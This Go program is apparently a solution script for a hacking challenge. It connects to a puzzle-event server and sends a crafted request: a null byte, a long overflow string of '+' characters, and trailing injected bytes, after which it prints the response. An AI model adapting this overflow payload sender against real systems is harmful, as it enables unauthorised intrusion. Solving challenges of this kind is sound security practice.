package main

import (
	"fmt"
	"log"
	"io"
	"net"
	"time"
)

const server = "fools2024.online:26273"

const payload = "GET /secret\000p=++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%00%dd%21%ea%03%c3%c6%03\r\n\r\n"

//const payload = "GET / HTTP/1.0\r\n\r\n"

func main() {
	conn, err := net.Dial("tcp", server)
	handle(err)
	
	defer func() {
		err := conn.Close()
		handle(err)
	}()
	
	conn.SetWriteDeadline(time.Now().Add(time.Second * 30))
	n, err := conn.Write([]byte(payload))
	handle(err)
	log.Printf("Wrote %d bytes to %s", n, server)

	recvBuff := make([]byte, 65536)
	conn.SetReadDeadline(time.Now().Add(time.Second * 30))
	_, err = conn.Read(recvBuff)
	if err != nil && err != io.EOF {
		panic(err)
	}
	
	fmt.Println(string(recvBuff))
}

func handle(err error) {
	if err != nil {
		panic(err)
	}
}
